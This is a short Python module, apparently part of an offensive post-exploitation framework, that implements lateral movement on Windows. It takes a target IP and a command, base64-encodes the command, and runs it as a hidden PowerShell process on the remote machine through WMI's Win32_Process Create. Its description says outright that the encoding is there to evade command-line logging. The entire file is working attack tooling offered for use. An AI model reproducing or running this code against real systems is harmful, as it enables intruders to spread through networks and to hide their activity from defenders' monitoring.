MODULE_INFO = {
    "name": "lat_wmi",
    "description": "Lateral movement via WMI (Win32_Process). Executes an encoded command to evade command-line logging.",
    "platform": "windows"
}

def run(session, args):
    if len(args) < 2:
        return "[!] Usage: use lat_wmi <target_ip> <command_to_execute>"
    
    target = args[0]
    cmd_exec = " ".join(args[1:])
    escaped_cmd = cmd_exec.replace("'", "''")
    
    cmd = f"""
$target = "{target}"
$cmd = '{escaped_cmd}'
Write-Output "[*] Preparing encoded payload for WMI execution..."

$payloadBytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($payloadBytes)
$runCmd = "powershell.exe -nop -w hidden -enc $enc"

Write-Output "[*] Spawning WmiPrvSE.exe on $target..."

try {{
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $runCmd -ComputerName $target | Out-String
    Write-Output "[+] Command dispatched successfully!"
}} catch {{
    Write-Output "[!] WMI failed: $($_.Exception.Message)"
}}
"""
    return cmd
